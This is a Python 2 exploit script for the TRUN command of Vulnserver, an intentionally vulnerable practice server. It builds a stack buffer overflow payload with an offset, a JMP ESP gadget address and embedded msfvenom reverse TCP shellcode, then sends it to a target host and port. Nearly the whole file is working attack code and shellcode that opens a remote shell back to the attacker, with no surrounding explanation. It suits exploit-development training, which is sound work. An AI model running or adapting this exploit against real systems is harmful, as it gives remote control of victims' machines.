#!/usr/bin/env python2
import socket
import struct
import argparse

# Parse args
parser = argparse.ArgumentParser(description='Vulnserver TRUN command exploit')
parser.add_argument('-t', '--target', help='Host running Vulnserver to exploit', required=True)
parser.add_argument('-p', '--port', help='Port to use', nargs='?', const=int, default=9999)

args = parser.parse_args()

# Set conn info
rhost = args.target
rport = args.port

# Instantiate socket
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect((rhost, rport))

# Buffer params
# badchars == "\x00\x01\x0A\x0D"
"""
Boofuzz's input of TRUN /.:/ + "A" spike worked. Total size was 5013.

We rewrite IEP 2012 bytes in.
"""

buf_maxlen = 5014
offset_iep = 2012
gadget_addr = 0x625011AF # JMP ESP inside essfunc.dll
sub_esp_16b = b"\x83\xec\x10"
start = b"TRUN /.:/"
end = b"\r\n" 

# Shellcode
# msfvenom -p windows/shell/reverse_tcp LHOST=$ LPORT=$ EXITFUNC=thread -b "\x00\x01\x0a\x0d" -f python

shellcode =  b""
shellcode += b"\xdb\xcb\xd9\x74\x24\xf4\xbf\x36\x2f\x19\x54"
shellcode += b"\x58\x31\xc9\xb1\x5b\x31\x78\x19\x03\x78\x19"
shellcode += b"\x83\xe8\xfc\xd4\xda\xe5\xbc\x9a\x25\x16\x3d"
shellcode += b"\xfa\xac\xf3\x0c\x3a\xca\x70\x3e\x8a\x98\xd5"
shellcode += b"\xb3\x61\xcc\xcd\x40\x07\xd9\xe2\xe1\xad\x3f"
shellcode += b"\xcc\xf2\x9d\x7c\x4f\x71\xdf\x50\xaf\x48\x10"
shellcode += b"\xa5\xae\x8d\x4c\x44\xe2\x46\x1b\xfb\x13\xe2"
shellcode += b"\x51\xc0\x98\xb8\x74\x40\x7c\x08\x77\x61\xd3"
shellcode += b"\x02\x2e\xa1\xd5\xc7\x5b\xe8\xcd\x04\x61\xa2"
shellcode += b"\x66\xfe\x1e\x35\xaf\xce\xdf\x9a\x8e\xfe\x12"
shellcode += b"\xe2\xd7\x39\xcc\x91\x21\x3a\x71\xa2\xf5\x40"
shellcode += b"\xad\x27\xee\xe3\x26\x9f\xca\x12\xeb\x46\x98"
shellcode += b"\x19\x40\x0c\xc6\x3d\x57\xc1\x7c\x39\xdc\xe4"
shellcode += b"\x52\xcb\xa6\xc2\x76\x97\x7d\x6a\x2e\x7d\xd0"
shellcode += b"\x93\x30\xde\x8d\x31\x3a\xf3\xda\x4b\x61\x9c"
shellcode += b"\x2f\x66\x9a\x5c\x27\xf1\xe9\x6e\xe8\xa9\x65"
shellcode += b"\xc3\x61\x74\x71\x52\x65\x87\xad\xdc\xe5\x79"
shellcode += b"\x4e\x1d\x2c\xbe\x1a\x4d\x46\x17\x23\x06\x96"
shellcode += b"\x98\xf6\xb3\x9c\x0e\x39\xeb\x28\xce\xd1\xee"
shellcode += b"\x28\xde\x7d\x66\xce\xb0\x2d\x28\x5e\x71\x9e"
shellcode += b"\x88\x0e\x19\xf4\x06\x71\x39\xf7\xcc\x1a\xd0"
shellcode += b"\x18\xb9\x73\x4d\x80\xe0\x0f\xec\x4d\x3f\x6a"
shellcode += b"\x2e\xc5\xca\x8b\xe1\x2e\xbe\x9f\x16\x49\x40"
shellcode += b"\x5f\xe7\xfc\x40\x35\xe3\x56\x16\xa1\xe9\x8f"
shellcode += b"\x50\x6e\x11\xfa\xe2\x68\xed\x7b\xd3\x03\xd8"
shellcode += b"\xe9\x5b\x7b\x25\xfe\x5b\x7b\x73\x94\x5b\x13"
shellcode += b"\x23\xcc\x0f\x06\x2c\xd9\x23\x9b\xb9\xe2\x15"
shellcode += b"\x48\x69\x8b\x9b\xb7\x5d\x14\x63\x92\xdd\x53"
shellcode += b"\x9b\x61\xca\xfb\xf4\x99\x4a\xfc\x04\xf3\x4a"
shellcode += b"\xac\x6c\x08\x64\x43\x5d\xf1\xaf\x0c\xf5\x78"
shellcode += b"\x3e\xfe\x64\x7d\x6b\x5e\x39\x7e\x98\x7b\xca"
shellcode += b"\x05\xd1\x7c\x2b\xfa\xfb\x18\x2b\xfb\x03\x1f"
shellcode += b"\x17\x2a\x3a\x55\x56\xef\x79\x76\x45\xc5\x77"
shellcode += b"\x1f\xd0\x8c\x35\x42\xe3\x7b\x79\x7b\x60\x89"
shellcode += b"\x02\x78\x78\xf8\x07\xc4\x3e\x11\x7a\x55\xab"
shellcode += b"\x15\x29\x56\xfe"

# Build our buffer

buf = b""
buf += start                          # Attach start of message to buffer
buf += b"A" * (offset_iep - len(buf)) # Top padding
buf += struct.pack("<I", gadget_addr) # Ensure LE + overwrite IEP with gadget addr
buf += sub_esp_16b                    # Pull up ESP
buf += shellcode                      # Inject our shellcode
buf += b"D" * (buf_maxlen - len(buf)) # Bottom padding
buf += end                            # Message ends with CLRF

# Receive banner/send buffer

conn.recv(10000)
conn.send(buf)